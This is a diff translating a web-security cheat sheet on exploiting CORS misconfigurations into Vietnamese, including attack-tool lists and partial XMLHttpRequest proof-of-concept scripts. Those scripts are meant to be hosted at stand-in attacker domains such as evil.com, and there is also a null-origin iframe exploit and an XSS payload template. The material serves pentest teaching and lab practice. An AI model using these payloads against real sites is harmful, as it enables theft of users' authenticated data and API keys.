@@ -1,41 +1,41 @@
-# CORS Misconfiguration
+# Cấu hình sai CORS (CORS Misconfiguration)
 
-> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker's site using the victim's credentials.
+> Một lỗi cấu hình sai CORS trên toàn bộ trang web đã tồn tại đối với một domain API. Điều này cho phép kẻ tấn công thực hiện các request cross origin thay mặt cho người dùng vì ứng dụng không đưa header Origin vào whitelist và có Access-Control-Allow-Credentials: true, nghĩa là chúng ta có thể thực hiện request từ site của kẻ tấn công bằng cách sử dụng thông tin xác thực của nạn nhân.
 
-## Summary
+## Mục lục
 
-* [Tools](#tools)
-* [Requirements](#requirements)
-* [Methodology](#methodology)
-    * [Origin Reflection](#origin-reflection)
+* [Công cụ](#tools)
+* [Yêu cầu](#requirements)
+* [Phương pháp](#methodology)
+    * [Phản chiếu Origin (Origin Reflection)](#origin-reflection)
     * [Null Origin](#null-origin)
-    * [XSS on Trusted Origin](#xss-on-trusted-origin)
-    * [Wildcard Origin without Credentials](#wildcard-origin-without-credentials)
-    * [Expanding the Origin](#expanding-the-origin)
-* [Labs](#labs)
-* [References](#references)
+    * [XSS trên Origin đáng tin cậy](#xss-on-trusted-origin)
+    * [Wildcard Origin không có Credentials](#wildcard-origin-without-credentials)
+    * [Mở rộng Origin](#expanding-the-origin)
+* [Bài lab](#labs)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
-* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
-* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
-* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
-* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
+* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - Công cụ quét lỗi cấu hình CORS
+* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Công cụ quét lỗ hổng cấu hình sai CORS nhanh
+* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - Trình xây dựng POC
+* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Khai thác các lỗi cấu hình sai CORS trên mạng nội bộ
+* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Công cụ phát hiện nhanh lỗi cấu hình sai CORS
 
-## Requirements
+## Yêu cầu
 
-* BURP HEADER> `Origin: https://evil.com`
-* VICTIM HEADER> `Access-Control-Allow-Credential: true`
-* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
+* HEADER CỦA BURP> `Origin: https://evil.com`
+* HEADER CỦA NẠN NHÂN> `Access-Control-Allow-Credential: true`
+* HEADER CỦA NẠN NHÂN> `Access-Control-Allow-Origin: https://evil.com` HOẶC `Access-Control-Allow-Origin: null`
 
-## Methodology
+## Phương pháp
 
-Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.
+Thông thường bạn sẽ muốn nhắm mục tiêu vào một API endpoint. Sử dụng payload sau để khai thác một lỗi cấu hình sai CORS trên mục tiêu `https://victim.example.com/endpoint`.
 
-### Origin Reflection
+### Phản chiếu Origin (Origin Reflection)
 
-#### Vulnerable Implementation
+#### Cách triển khai dễ bị tổn thương
 
 ```powershell
 GET /endpoint HTTP/1.1
@@ -50,9 +50,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof Of Concept
+#### Bằng chứng khái niệm (Proof Of Concept)
 
-This PoC requires that the respective JS script is hosted at `evil.com`
+PoC này yêu cầu script JS tương ứng phải được host tại `evil.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -66,7 +66,7 @@ function reqListener() {
 };
 ```
 
-or
+hoặc
 
 ```html
 <html>
@@ -95,11 +95,11 @@ or
 
 ### Null Origin
 
-#### Vulnerable Implementation
+#### Cách triển khai dễ bị tổn thương
 
-It's possible that the server does not reflect the complete `Origin` header but
-that the `null` origin is allowed. This would look like this in the server's
-response:
+Có thể server không phản chiếu (reflect) toàn bộ header `Origin` nhưng
+origin `null` lại được cho phép. Điều này sẽ trông như thế này trong phản hồi
+của server:
 
 ```ps1
 GET /endpoint HTTP/1.1
@@ -114,11 +114,11 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof Of Concept
+#### Bằng chứng khái niệm (Proof Of Concept)
 
-This can be exploited by putting the attack code into an iframe using the data
-URI scheme. If the data URI scheme is used, the browser will use the `null`
-origin in the request:
+Điều này có thể bị khai thác bằng cách đặt mã tấn công vào một iframe sử dụng
+data URI scheme. Nếu data URI scheme được sử dụng, trình duyệt sẽ dùng origin
+`null` trong request:
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
@@ -134,31 +134,32 @@ origin in the request:
 </script>"></iframe> 
 ```
 
-### XSS on Trusted Origin
+### XSS trên Origin đáng tin cậy
 
-If the application does implement a strict whitelist of allowed origins, the
-exploit codes from above do not work. But if you have an XSS on a trusted
-origin, you can inject the exploit coded from above in order to exploit CORS
-again.
+Nếu ứng dụng có triển khai một whitelist nghiêm ngặt các origin được phép,
+đoạn mã khai thác ở trên sẽ không hoạt động. Nhưng nếu bạn có một lỗ hổng XSS
+trên một origin đáng tin cậy, bạn có thể chèn đoạn mã khai thác ở trên để
+khai thác CORS một lần nữa.
 
 ```ps1
 https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
-### Wildcard Origin without Credentials
+### Wildcard Origin không có Credentials
 
-If the server responds with a wildcard origin `*`, **the browser does never send
-the cookies**. However, if the server does not require authentication, it's still
-possible to access the data on the server. This can happen on internal servers
-that are not accessible from the Internet. The attacker's website can then
-pivot into the internal network and access the server's data without authentication.
+Nếu server phản hồi với một wildcard origin `*`, **trình duyệt sẽ không bao giờ
+gửi cookie**. Tuy nhiên, nếu server không yêu cầu xác thực, vẫn có thể truy
+cập dữ liệu trên server. Điều này có thể xảy ra trên các server nội bộ không
+thể truy cập được từ Internet. Website của kẻ tấn công sau đó có thể xoay
+trục (pivot) vào mạng nội bộ và truy cập dữ liệu của server mà không cần xác
+thực.
 
 ```powershell
-* is the only wildcard origin
-https://*.example.com is not valid
+* là wildcard origin duy nhất
+https://*.example.com không hợp lệ
 ```
 
-#### Vulnerable Implementation
+#### Cách triển khai dễ bị tổn thương
 
 ```powershell
 GET /endpoint HTTP/1.1
@@ -171,7 +172,7 @@ Access-Control-Allow-Origin: *
 {"[private API key]"}
 ```
 
-#### Proof Of Concept
+#### Bằng chứng khái niệm (Proof Of Concept)
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -184,13 +185,16 @@ function reqListener() {
 };
 ```
 
-### Expanding the Origin
+### Mở rộng Origin
 
-Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
+Đôi khi, một số cách mở rộng của origin gốc lại không được lọc ở phía server.
+Điều này có thể do sử dụng biểu thức chính quy (regular expressions) được
+triển khai kém để xác thực header origin.
 
-#### Vulnerable Implementation (Example 1)
+#### Cách triển khai dễ bị tổn thương (Ví dụ 1)
 
-In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
+Trong kịch bản này, bất kỳ tiền tố nào được chèn vào phía trước `example.com`
+đều sẽ được server chấp nhận.
 
 ```ps1
 GET /endpoint HTTP/1.1
@@ -204,9 +208,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of Concept (Example 1)
+#### Bằng chứng khái niệm (Ví dụ 1)
 
-This PoC requires the respective JS script to be hosted at `evilexample.com`
+PoC này yêu cầu script JS tương ứng phải được host tại `evilexample.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -220,9 +224,12 @@ function reqListener() {
 };
 ```
 
-#### Vulnerable Implementation (Example 2)
+#### Cách triển khai dễ bị tổn thương (Ví dụ 2)
 
-In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+Trong kịch bản này, server sử dụng một regex mà dấu chấm không được escape
+đúng cách. Chẳng hạn, một thứ gì đó giống như: `^api.example.com$` thay vì
+`^api\.example.com$`. Do đó, dấu chấm có thể được thay thế bằng bất kỳ chữ
+cái nào để có được quyền truy cập từ một domain của bên thứ ba.
 
 ```ps1
 GET /endpoint HTTP/1.1
@@ -236,9 +243,9 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of concept (Example 2)
+#### Bằng chứng khái niệm (Ví dụ 2)
 
-This PoC requires the respective JS script to be hosted at `apiiexample.com`
+PoC này yêu cầu script JS tương ứng phải được host tại `apiiexample.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -252,14 +259,14 @@ function reqListener() {
 };
 ```
 
-## Labs
+## Bài lab
 
 * [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
 * [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
 * [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
 * [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
-## References
+## Tài liệu tham khảo
 
 * [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
 * [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
